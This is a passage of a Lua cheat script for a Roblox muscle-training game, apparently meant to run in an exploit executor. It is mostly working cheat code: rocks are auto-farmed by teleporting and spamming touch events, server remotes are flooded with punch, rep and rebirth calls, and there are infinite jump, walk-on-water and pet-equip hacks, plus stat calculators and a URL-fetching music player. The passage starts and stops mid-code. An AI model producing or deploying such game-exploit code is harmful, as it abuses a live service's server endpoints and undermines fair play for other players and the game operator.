        if game.CoreGui:FindFirstChild("thisoneissocoldww") then
            game.CoreGui.thisoneissocoldww:Destroy()
        end
    end
end)
-- 📂 ROCK V2
local FolderROCK2 = farmTab:AddFolder("ROCK-V2")

getgenv().autoFarm = false
getgenv().autoPunch = false

-- 📍 TP A LA ROCA
local function tpToRock(rock)
    local LP = game.Players.LocalPlayer
    local char = LP.Character

    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = rock.CFrame + Vector3.new(0,3,0)
    end
end

-- 👊 AUTO PUNCH
spawn(function()
    while task.wait(0) do
        if getgenv().autoPunch then
            local remote = game.Players.LocalPlayer:FindFirstChild("muscleEvent")

            if remote then
                remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
            end
        end
    end
end)

-- ⚡ FARM ROCK
local function farmRock(targetDurability)
    spawn(function()

        -- 🔥 activa auto punch automáticamente
        getgenv().autoPunch = true

        while getgenv().autoFarm do
            local LP = game.Players.LocalPlayer
            local char = LP.Character

            if char and char:FindFirstChild("RightHand") and char:FindFirstChild("LeftHand") then
                local right = char.RightHand
                local left = char.LeftHand

                for _, v in pairs(workspace.machinesFolder:GetDescendants()) do
                    if v.Name == "neededDurability" and v.Value == targetDurability then
                        local rock = v.Parent:FindFirstChild("Rock")

                        if rock then
                            -- 📍 TP
                            tpToRock(rock)

                            -- 💥 TOUCH
                            for i = 1, 300 do
                                firetouchinterest(rock, right, 0)
                                firetouchinterest(rock, right, 1)

                                firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
									firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                            end
                        end
                    end
                end
            end

            task.wait(0)
        end

        -- ❌ desactiva auto punch al apagar
        getgenv().autoPunch = false
    end)
end

-- 🪨 ROCKS
FolderROCK2:AddSwitch("Tiny Island Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(0) end
end)

FolderROCK2:AddSwitch("Starter Island Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(100) end
end)

FolderROCK2:AddSwitch("Legend Beach Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(5000) end
end)

FolderROCK2:AddSwitch("Frost Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(150000) end
end)

FolderROCK2:AddSwitch("Mythical Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(400000) end
end)

FolderROCK2:AddSwitch("Eternal Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(750000) end
end)

FolderROCK2:AddSwitch("Legend Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(1000000) end
end)

FolderROCK2:AddSwitch("Muscle King Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(5000000) end
end)

FolderROCK2:AddSwitch("Ancient Jungle Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(10000000) end
end)
local FolderROCK3 = farmTab:AddFolder("ROCK-V3")

getgenv().autoFarmV3 = false
getgenv().autoPunchV3 = false

-- 🪨 TRAER ROCA
local function bringRockV3(rock)
    local char = game.Players.LocalPlayer.Character

    if char and char:FindFirstChild("HumanoidRootPart") then
        rock.CFrame = char.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
    end
end

-- 👊 AUTO PUNCH
spawn(function()
    while task.wait(0) do
        if getgenv().autoPunchV3 then
            local remote = game.Players.LocalPlayer:FindFirstChild("muscleEvent")

            if remote then
                remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
				remote:FireServer("punch","rightHand")
                remote:FireServer("punch","leftHand")
            end
        end
    end
end)

-- ⚡ FARM
local function farmRockV3(targetDurability)
    spawn(function()

        getgenv().autoPunchV3 = true

        while getgenv().autoFarmV3 do
            local LP = game.Players.LocalPlayer
            local char = LP.Character

            if char and char:FindFirstChild("RightHand") and char:FindFirstChild("LeftHand") then
                local right = char.RightHand
                local left = char.LeftHand

                for _,v in pairs(workspace.machinesFolder:GetDescendants()) do
                    if v.Name == "neededDurability" and v.Value == targetDurability then
                        local rock = v.Parent:FindFirstChild("Rock")

                        if rock then
                            -- 🪨 TRAER ROCA
                            bringRockV3(rock)

                            -- 💥 TOUCH SPAM
                            for i = 1,400 do
                                firetouchinterest(rock, right, 0)
                                firetouchinterest(rock, right, 1)

                                firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, right, 0)
                                firetouchinterest(rock, right, 1)

                                firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
									firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
                            end
                        end
                    end
                end
            end

            task.wait(0)
        end

        getgenv().autoPunchV3 = false
    end)
end

-- 🪨 ROCKS
FolderROCK3:AddSwitch("Tiny Island Rock", function(bool)
    getgenv().autoFarmV3 = bool
    if bool then farmRockV3(0) end
end)

FolderROCK3:AddSwitch("Starter Island Rock", function(bool)
    getgenv().autoFarmV3 = bool
    if bool then farmRockV3(100) end
end)

FolderROCK3:AddSwitch("Legend Beach Rock", function(bool)
    getgenv().autoFarmV3 = bool
    if bool then farmRockV3(5000) end
end)

FolderROCK3:AddSwitch("Frost Gym Rock", function(bool)
    getgenv().autoFarmV3 = bool
    if bool then farmRockV3(150000) end
end)

FolderROCK3:AddSwitch("Mythical Gym Rock", function(bool)
    getgenv().autoFarmV3 = bool
    if bool then farmRockV3(400000) end
end)

FolderROCK3:AddSwitch("Eternal Gym Rock", function(bool)
    getgenv().autoFarmV3 = bool
    if bool then farmRockV3(750000) end
end)

FolderROCK3:AddSwitch("Legend Gym Rock", function(bool)
    getgenv().autoFarmV3 = bool
    if bool then farmRockV3(1000000) end
end)

FolderROCK3:AddSwitch("Muscle King Gym Rock", function(bool)
    getgenv().autoFarmV3 = bool
    if bool then farmRockV3(5000000) end
end)

FolderROCK3:AddSwitch("Ancient Jungle Rock", function(bool)
    getgenv().autoFarmV3 = bool
    if bool then farmRockV3(10000000) end
end)

local Calculadora = window:AddTab("calculator", Color3.fromRGB(200, 100, 100))

local baseStrength = 0
local resultadoLabelsDamage = {}

local FolderDamage = Calculadora:AddFolder("Pack Damage Calculator")

FolderDamage:AddTextBox("Base Strongth (ej: 1.27Qa, T, B)", function(text)
    local unidades = { ["T"] = 1e12, ["Q"] = 1e15, ["B"] = 1e9 }
    text = text:upper()
    for u, m in pairs(unidades) do
        if text:find(u) then
            local num = tonumber(text:match("(%d+%.?%d*)"))
            if num then
                baseStrength = num * m
                return
            end
        end
    end
    baseStrength = tonumber(text:match("(%d+%.?%d*)")) or 0
end)

local mensajeLabelDamage = FolderDamage:AddLabel("")

for i = 1, 8 do
    resultadoLabelsDamage[i] = FolderDamage:AddLabel(string.format("%d pack(s): -", i))
end

FolderDamage:AddButton("Calculate Damage", function()
    if baseStrength <= 0 then
        mensajeLabelDamage.Text = "Enter a valid value."
        for i = 1, 8 do
            resultadoLabelsDamage[i].Text = string.format("%d pack(s): -", i)
        end
        return
    end

    mensajeLabelDamage.Text = ""

    local danoAjustado = baseStrength * 0.10
    local incremento = 0.335

    for pack = 1, 8 do
        local mult = 1 + (pack * incremento)
        local valor = danoAjustado * mult

        local disp
        if valor >= 1e15 then
            disp = string.format("%.3f Qa", valor / 1e15)
        elseif valor >= 1e12 then
            disp = string.format("%.2f T", valor / 1e12)
        elseif valor >= 1e9 then
            disp = string.format("%.2f B", valor / 1e9)
        else
            disp = tostring(math.floor(valor))
        end

        resultadoLabelsDamage[pack].Text = string.format("%d pack(s): %s", pack, disp)
    end
end)

local baseDurabilidad = 0
local resultadoLabelsDurabilidad = {}

local FolderDurabilidad = Calculadora:AddFolder("Pack Durability Calculator")

FolderDurabilidad:AddTextBox("Base durability (ej: 1.27Qa, T, B)", function(text)
    local unidades = { ["T"] = 1e12, ["Q"] = 1e15, ["B"] = 1e9 }
    text = text:upper()
    for u, m in pairs(unidades) do
        if text:find(u) then
            local num = tonumber(text:match("(%d+%.?%d*)"))
            if num then
                baseDurabilidad = num * m
                return
            end
        end
    end
    baseDurabilidad = tonumber(text:match("(%d+%.?%d*)")) or 0
end)

local mensajeLabelDurabilidad = FolderDurabilidad:AddLabel("")

for i = 1, 8 do
    resultadoLabelsDurabilidad[i] = FolderDurabilidad:AddLabel(string.format("%d pack(s): -", i))
end

FolderDurabilidad:AddButton("Calculate Durability", function()
    if baseDurabilidad <= 0 then
        mensajeLabelDurabilidad.Text = "Enter a valid value."
        for i = 1, 8 do
            resultadoLabelsDurabilidad[i].Text = string.format("%d pack(s): -", i)
        end
        return
    end

    mensajeLabelDurabilidad.Text = ""

    local incremento = 0.335
    local adicional = 1.5

    for pack = 1, 8 do
        local mult = 1 + (pack * incremento)
        local valor = baseDurabilidad * mult * adicional

        local disp
        if valor >= 1e15 then
            disp = string.format("%.3f Qa", valor / 1e15)
        elseif valor >= 1e12 then
            disp = string.format("%.2f T", valor / 1e12)
        elseif valor >= 1e9 then
            disp = string.format("%.2f B", valor / 1e9)
        else
            disp = tostring(math.floor(valor))
        end

        resultadoLabelsDurabilidad[pack].Text = string.format("%d pack(s): %s", pack, disp)
    end
end)



local FarmingTab = window:AddTab("Fast Farm")

local strengthStat = leaderstats:WaitForChild("Strength")
local durabilityStat = player:WaitForChild("Durability")

local function formatNumber(number)
    local isNegative = number < 0
    number = math.abs(number)
    if number >= 1e15 then
        return (isNegative and "-" or "") .. string.format("%.2fQa", number / 1e15)
    elseif number >= 1e12 then
        return (isNegative and "-" or "") .. string.format("%.2fT", number / 1e12)
    elseif number >= 1e9 then
        return (isNegative and "-" or "") .. string.format("%.2fB", number / 1e9)
    elseif number >= 1e6 then
        return (isNegative and "-" or "") .. string.format("%.2fM", number / 1e6)
    elseif number >= 1e3 then
        return (isNegative and "-" or "") .. string.format("%.2fK", number / 1e3)
    else
        return (isNegative and "-" or "") .. string.format("%.2f", number)
    end
end

FarmingTab:AddLabel("Time:").TextSize = 20
local stopwatchLabel = FarmingTab:AddLabel("0d 0h 0m 0s - Fast Rep Inactive")
stopwatchLabel.TextSize = 17
stopwatchLabel.TextColor3 = Color3.fromRGB(255, 50, 50)

local projectedStrengthLabel = FarmingTab:AddLabel("Strength Pace: 0 /Hour | 0 /Day | 0 /Week")
projectedStrengthLabel.TextSize = 17
local projectedDurabilityLabel = FarmingTab:AddLabel("Durability Pace: 0 /Hour | 0 /Day | 0 /Week")
projectedDurabilityLabel.TextSize = 17
local averageStrengthLabel = FarmingTab:AddLabel("Average Strength Pace: 0 /Hour | 0 /Day | 0 /Week")
averageStrengthLabel.TextSize = 17
local averageDurabilityLabel = FarmingTab:AddLabel("Average Durability Pace: 0 /Hour | 0 /Day | 0 /Week")
averageDurabilityLabel.TextSize = 17

FarmingTab:AddLabel("").TextSize = 10
local statsLabel = FarmingTab:AddLabel("Stats:")
statsLabel.TextSize = 20
local strengthLabel = FarmingTab:AddLabel("Strength: 0 | Gained: 0")
strengthLabel.TextSize = 17
local durabilityLabel = FarmingTab:AddLabel("Durability: 0 | Gained: 0")
durabilityLabel.TextSize = 17

local startTime = 0
local pausedElapsedTime = 0
local lastPauseTime = 0

local runFastRep = false
local trackingStarted = false

local strengthHistory = {}
local durabilityHistory = {}
local calculationInterval = 10

local initialStrength = strengthStat.Value
local initialDurability = durabilityStat.Value

task.spawn(function()
    local lastCalcTime = tick()
    while true do
        local currentTime = tick()
        local currentStrength = strengthStat.Value
        local currentDurability = durabilityStat.Value

        strengthLabel.Text = "Strength: " .. formatNumber(currentStrength) .. " | Gained: " .. formatNumber(currentStrength - initialStrength)
        durabilityLabel.Text = "Durability: " .. formatNumber(currentDurability) .. " | Gained: " .. formatNumber(currentDurability - initialDurability)

        if runFastRep then
            if not trackingStarted then
                trackingStarted = true
                startTime = currentTime
                strengthHistory = {}
                durabilityHistory = {}
            end
            local elapsedTime = pausedElapsedTime + (currentTime - startTime)
            local days = math.floor(elapsedTime / (24 * 3600))
            local hours = math.floor((elapsedTime % (24 * 3600)) / 3600)
            local minutes = math.floor((elapsedTime % 3600) / 60)
            local seconds = math.floor(elapsedTime % 60)
            stopwatchLabel.Text = string.format("%dd %dh %dm %ds - Fast Rep Running", days, hours, minutes, seconds)
            stopwatchLabel.TextColor3 = Color3.fromRGB(50, 255, 50)

            table.insert(strengthHistory, {time = currentTime, value = currentStrength})
            table.insert(durabilityHistory, {time = currentTime, value = currentDurability})

            while #strengthHistory > 0 and currentTime - strengthHistory[1].time > calculationInterval do
                table.remove(strengthHistory, 1)
            end
            while #durabilityHistory > 0 and currentTime - durabilityHistory[1].time > calculationInterval do
                table.remove(durabilityHistory, 1)
            end

            if currentTime - lastCalcTime >= calculationInterval then
                lastCalcTime = currentTime

                if #strengthHistory >= 2 then
                    local strengthDelta = strengthHistory[#strengthHistory].value - strengthHistory[1].value
                    local strengthPerSecond = strengthDelta / calculationInterval
                    local strengthPerHour = strengthPerSecond * 3600
                    local strengthPerDay = strengthPerSecond * 86400
                    local strengthPerWeek = strengthPerSecond * 604800
                    projectedStrengthLabel.Text = "Strength Pace: " .. formatNumber(strengthPerHour) .. "/Hour | " .. formatNumber(strengthPerDay) .. "/Day | " .. formatNumber(strengthPerWeek) .. "/Week"
                end

                if #durabilityHistory >= 2 then
                    local durabilityDelta = durabilityHistory[#durabilityHistory].value - durabilityHistory[1].value
                    local durabilityPerSecond = durabilityDelta / calculationInterval
                    local durabilityPerHour = durabilityPerSecond * 3600
                    local durabilityPerDay = durabilityPerSecond * 86400
                    local durabilityPerWeek = durabilityPerSecond * 604800
                    projectedDurabilityLabel.Text = "Durability Pace: " .. formatNumber(durabilityPerHour) .. "/Hour | " .. formatNumber(durabilityPerDay) .. "/Day | " .. formatNumber(durabilityPerWeek) .. "/Week"
                end

                local totalElapsed = pausedElapsedTime + (currentTime - startTime)
                if totalElapsed > 0 then
                    local avgStrengthPerSecond = (currentStrength - initialStrength) / totalElapsed
                    local avgStrengthPerHour = avgStrengthPerSecond * 3600
                    local avgStrengthPerDay = avgStrengthPerSecond * 86400
                    local avgStrengthPerWeek = avgStrengthPerSecond * 604800
                    averageStrengthLabel.Text = "Average Strength Pace: " .. formatNumber(avgStrengthPerHour) .. "/Hour | " .. formatNumber(avgStrengthPerDay) .. "/Day | " .. formatNumber(avgStrengthPerWeek) .. "/Week"

                    local avgDurabilityPerSecond = (currentDurability - initialDurability) / totalElapsed
                    local avgDurabilityPerHour = avgDurabilityPerSecond * 3600
                    local avgDurabilityPerDay = avgDurabilityPerSecond * 86400
                    local avgDurabilityPerWeek = avgDurabilityPerSecond * 604800
                    averageDurabilityLabel.Text = "Average Durability Pace: " .. formatNumber(avgDurabilityPerHour) .. "/Hour | " .. formatNumber(avgDurabilityPerDay) .. "/Day | " .. formatNumber(avgDurabilityPerWeek) .. "/Week"
                end
            end
        else
            if trackingStarted then
                trackingStarted = false
                pausedElapsedTime = pausedElapsedTime + (currentTime - startTime)
                stopwatchLabel.Text = string.format("%dd %dh %dm %ds - Fast Rep Stopped", math.floor(pausedElapsedTime / (24 * 3600)), math.floor((pausedElapsedTime % (24 * 3600)) / 3600), math.floor((pausedElapsedTime % 3600) / 60), math.floor(pausedElapsedTime % 60))
                stopwatchLabel.TextColor3 = Color3.fromRGB(255, 165, 0)

                projectedStrengthLabel.Text = "Strength Pace: 0 /Hour | 0 /Day | 0 /Week"
                projectedDurabilityLabel.Text = "Durability Pace: 0 /Hour | 0 /Day | 0 /Week"
                averageStrengthLabel.Text = "Average Strength Pace: 0 /Hour | 0 /Day | 0 /Week"
                averageDurabilityLabel.Text = "Average Durability Pace: 0 /Hour | 0 /Day | 0 /Week"

                strengthHistory = {}
                durabilityHistory = {}
            end
        end

        task.wait(0.05)
    end
end)

FarmingTab:AddLabel("")
FarmingTab:AddLabel("Fast Farm (Recommended Speed: 20)").TextSize = 20

local repsPerTick = 1

local function getPing()
    local stats = game:GetService("Stats")
    local pingStat = stats:FindFirstChild("PerformanceStats") and stats.PerformanceStats:FindFirstChild("Ping")
    return pingStat and pingStat:GetValue() or 0
end

FarmingTab:AddTextBox("Rep Speed", function(value)
    local num = tonumber(value)
    if num and num > 0 then
        repsPerTick = math.floor(num)
    end
end, {
    placeholder = "1",
})

local function fastRepLoop()
    while runFastRep do
        local startTick = tick()
        while tick() - startTick < 0.75 and runFastRep do
            for i = 1, repsPerTick do
                muscleEvent:FireServer("rep")
            end
            task.wait(0.02)
        end
        while runFastRep and getPing() >= 350 do
            task.wait(1)
        end
    end
end

FarmingTab:AddSwitch("Fast Rep", function(state)
    if state and not runFastRep then
        runFastRep = true
        task.spawn(fastRepLoop)
    elseif not state and runFastRep then
        runFastRep = false
    end
end)
local rebirthtab= window:AddTab("rebirths sin packs")

rebirthtab:AddTextBox("Rebirth Target", function(text)
    local newValue = tonumber(text)
    if newValue and newValue > 0 then
        targetRebirthValue = newValue
        updateStats() -- Call the stats update function
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Objetivo Actualizado",
            Text = "Nuevo objetivo: " .. tostring(targetRebirthValue) .. " renacimientos",
            Duration = 0
        })
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Size",
            Text = "Put a size larger than 0",
            Duration = 0
        })
    end
end)

local infiniteSwitch

local targetSwitch = rebirthtab:AddSwitch("Auto Rebirth Target", function(bool)
    _G.targetRebirthActive = bool
    
    if bool then
        if _G.infiniteRebirthActive and infiniteSwitch then
            infiniteSwitch:Set(false)
            _G.infiniteRebirthActive = false
        end
        
        spawn(function()
            while _G.targetRebirthActive and wait(0.1) do
                local currentRebirths = game.Players.LocalPlayer.leaderstats.Rebirths.Value
                
                if currentRebirths >= targetRebirthValue then
                    targetSwitch:Set(false)
                    _G.targetRebirthActive = false
                    
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "¡Objetivo Alcanzado!",
                        Text = "Has alcanzado " .. tostring(targetRebirthValue) .. " renacimientos",
                        Duration = 5
                    })
                    
                    break
                end
                
                game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
            end
        end)
    end
end, "automatic rebirth until reaching the goal")

infiniteSwitch = rebirthtab:AddSwitch("Auto Rebirth (Infinitely)", function(bool)
    _G.infiniteRebirthActive = bool
    
    if bool then
        if _G.targetRebirthActive and targetSwitch then
            targetSwitch:Set(false)
            _G.targetRebirthActive = false
        end
        
        spawn(function()
            while _G.infiniteRebirthActive and wait(0.1) do
                game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
            end
        end)
    end
end, "rebirth infinitely")

local sizeSwitch = rebirthtab:AddSwitch("Auto Size 2", function(bool)
    _G.autoSizeActive = bool
    
    if bool then
        spawn(function()
            while _G.autoSizeActive and wait() do
                game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 2)
            end
        end)
    end
end, "Size 2")

local teleportSwitch = rebirthtab:AddSwitch("Auto Teleport to Muscle King", function(bool)
    _G.teleportActive = bool
    
    if bool then
        spawn(function()
            while _G.teleportActive and wait() do
                if game.Players.LocalPlayer.Character then
                    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-8646, 17, -5738))
                end
            end
        end)
    end
end, "Tp to Mk")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local UIS = game:GetService("UserInputService")

local extraTab = window:AddTab("Extra")


--------------------------------------------------
-- 🔒 LOCK POSITION
--------------------------------------------------
local lockConn
local function onLockPosition(enabled)
    if enabled then
        lockConn = RunService.Heartbeat:Connect(function()
            local char = LocalPlayer.Character
            if not char then return end

            local hrp = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not hrp or not hum then return end

            if not hum:GetAttribute("Locked") then
                hum:SetAttribute("Locked", true)
                hum:SetAttribute("LockCF", hrp.CFrame)

                hum.WalkSpeed = 0
                hum.JumpPower = 0
                hum.AutoRotate = false
            end

            local cf = hum:GetAttribute("LockCF")
            if cf then
                hrp.CFrame = cf
                hrp.Velocity = Vector3.zero
                hrp.RotVelocity = Vector3.zero
            end
        end)
    else
        if lockConn then
            lockConn:Disconnect()
            lockConn = nil
        end

        local char = LocalPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")

        if hum then
            hum:SetAttribute("Locked", false)
            hum.WalkSpeed = 250
            hum.JumpPower = 50
            hum.AutoRotate = true
        end
    end
end

local LockSwitch = extraTab:AddSwitch("Lock Position", onLockPosition)
LockSwitch:Set(false)

--------------------------------------------------
-- 🐾 SHOW / HIDE PETS
--------------------------------------------------
local function onShowPets(enabled)
    local v = LocalPlayer:FindFirstChild("hidePets")
    if v then
        v.Value = enabled
    end
end

extraTab:AddSwitch("Show Pets", onShowPets)

--------------------------------------------------
-- 🦘 INFINITE JUMP
--------------------------------------------------
local infJump = false

local function onInfiniteJump(state)
    infJump = state
end

UIS.JumpRequest:Connect(function()
    if infJump then
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
end)

extraTab:AddSwitch("Infinite Jump", onInfiniteJump)

--------------------------------------------------
-- 🌊 WALK ON WATER (OPTIMIZADO)
--------------------------------------------------
local waterPart = nil

local function onWalkOnWater(state)
    if state then
        if not waterPart then
            waterPart = Instance.new("Part")
            waterPart.Size = Vector3.new(5000, 1, 5000)
            waterPart.Anchored = true
            waterPart.Transparency = 1
            waterPart.Name = "WaterPlatform"
            waterPart.Parent = workspace
        end

        local char = LocalPlayer.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                waterPart.Position = Vector3.new(hrp.Position.X, hrp.Position.Y - 5, hrp.Position.Z)
            end
        end

        RunService.Heartbeat:Connect(function()
            if waterPart then
                local char = LocalPlayer.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        waterPart.Position = Vector3.new(hrp.Position.X, hrp.Position.Y - 5, hrp.Position.Z)
                    end
                end
            end
        end)
    else
        if waterPart then
            waterPart:Destroy()
            waterPart = nil
        end
    end
end

local WalkWaterSwitch = extraTab:AddSwitch("Walk on Water", onWalkOnWater)
WalkWaterSwitch:Set(false)

--------------------------------------------------
-- 🌗 TIME CONTROL
--------------------------------------------------
local function onChangeTime(value)
    if value == "Night" then
        Lighting.ClockTime = 0
    elseif value == "Day" then
        Lighting.ClockTime = 12
    elseif value == "Midnight" then
        Lighting.ClockTime = 6
    end
end


local TimeDropdown = extraTab:AddDropdown("Change Time", onChangeTime)
TimeDropdown:Add("Night")
TimeDropdown:Add("Day")
TimeDropdown:Add("Midnight")


extraTab:AddButton("Equip Swift Samurai", function()
    print("Boton presionado: equipando 8 Swift Samurai")

    local LocalPlayer = game:GetService("Players").LocalPlayer
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    -- Primero desequipamos todo
    local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
    if not petsFolder then return end

    for _, folder in pairs(petsFolder:GetChildren()) do
        if folder:IsA("Folder") then
            for _, pet in pairs(folder:GetChildren()) do
                ReplicatedStorage.rEvents.equipPetEvent:FireServer("unequipPet", pet)
            end
        end
    end
    task.wait(0.1)

    -- Ahora equipamos mÃ¡ximo 8 "Swift Samurai"
    local equipped = 0
    local maxEquip = 8
    for _, folder in pairs(petsFolder:GetChildren()) do
        if folder:IsA("Folder") then
            for _, pet in pairs(folder:GetChildren()) do
                if pet.Name == "Swift Samurai" then
                    ReplicatedStorage.rEvents.equipPetEvent:FireServer("equipPet", pet)
                    equipped += 1
                    print("Equipado Swift Samurai #" .. equipped)

                    if equipped >= maxEquip then
                        return -- salir cuando ya haya 8 equipados
                    end
                end
            end
        end
    end

    print("Se equiparon " .. equipped .. " Swift Samurai")
end)

extraTab:AddButton("Jungle lift", function()
    local player = game.Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")

    -- Teletransportar al nuevo CFrame
    hrp.CFrame = CFrame.new(-8652.8672, 29.2667, 2089.2617)
    task.wait(0.2)

    local VirtualInputManager = game:GetService("VirtualInputManager")
    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(0.05)
    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end)



local MP3_URL = ""
local Playlist = {}
local currentIndex = 0
local isPaused = false
local fileName = "GenesisPlaylist_"..player.Name..".txt"
local tempIndex = 0
local currentSound = nil

if isfile(fileName) then
	local data = readfile(fileName)
	for url in string.gmatch(data, "[^,]+") do
		table.insert(Playlist, url)
	end
else
	writefile(fileName, "")
end

local function savePlaylist()
	writefile(fileName, table.concat(Playlist, ","))
end

local function formatTime(sec)
	sec = math.floor(sec or 0)
	local m = math.floor(sec / 60)
	local s = sec % 60
	return string.format("%02d:%02d", m, s)
end

local TimeLabel = extraTab:AddLabel("00:00 / 00:00")

local function loadMP3(url)
	if url == "" then return end
	tempIndex = tempIndex + 1
	local tempFile = "GenesisMusic_"..tempIndex..".mp3"

	pcall(function()
		if isfile(tempFile) then delfile(tempFile) end
		writefile(tempFile, game:HttpGet(url))
	end)

	if currentSound then
		currentSound:Destroy()
	end

	currentSound = Instance.new("Sound")
	currentSound.Name = "papi karmaMP3Sound"
	currentSound.Parent = SoundService
	currentSound.SoundId = getcustomasset(tempFile)
	currentSound.Volume = 1
	currentSound.Looped = false
	currentSound:Play()
	isPaused = false

	-- Cuando termina la canciÃ³n, pasa a la siguiente
	currentSound.Ended:Connect(function()
		if not currentSound.Looped and not isPaused then
			currentIndex = currentIndex + 1
			if currentIndex > #Playlist then currentIndex = 1 end
			loadMP3(Playlist[currentIndex])
		end
	end)
end

-- Bucle de actualizaciÃ³n de tiempo
task.spawn(function()
	while task.wait(0.1) do
		if currentSound and currentSound:IsDescendantOf(SoundService) and currentSound.IsLoaded then
			TimeLabel.Text = "â±ï¸ " .. formatTime(currentSound.TimePosition) .. " / " .. formatTime(currentSound.TimeLength)

			-- Respaldo por si el evento Ended falla
			if not currentSound.IsPlaying and not isPaused and currentSound.TimePosition > 0 and currentSound.TimePosition >= currentSound.TimeLength - 0.2 then
				currentIndex = currentIndex + 1
				if currentIndex > #Playlist then currentIndex = 1 end
				loadMP3(Playlist[currentIndex])
			end
		end
	end
end)

-- Controles
extraTab:AddTextBox(" MP3 URL", function(val)
	MP3_URL = val
end, {["clear"] = false})

extraTab:AddButton("Play", function()
	if MP3_URL ~= "" then
		loadMP3(MP3_URL)
	end
end)

extraTab:AddButton("Continue", function()
	if currentSound then
		if isPaused then
			isPaused = false
			currentSound:Resume()
		else
			currentSound:Play()
		end
	end
end)

extraTab:AddButton("Pause", function()
	if currentSound and currentSound.IsPlaying then
		currentSound:Pause()
		isPaused = true
	end
end)

extraTab:AddButton("Stop", function()
	if currentSound then
		currentSound:Stop()
		isPaused = false
	end
end)

extraTab:AddTextBox("Volumen (0-5)", function(val)
	if currentSound then
		local num = tonumber(val)
		if num then
			currentSound.Volume = math.clamp(num, 0, 5)
		end
	end
end, {["clear"] = false})

extraTab:AddButton("Toggle Loop", function()
	if currentSound then
		currentSound.Looped = not currentSound.Looped
	end
end)

extraTab:AddButton("Add to Playlist", function()
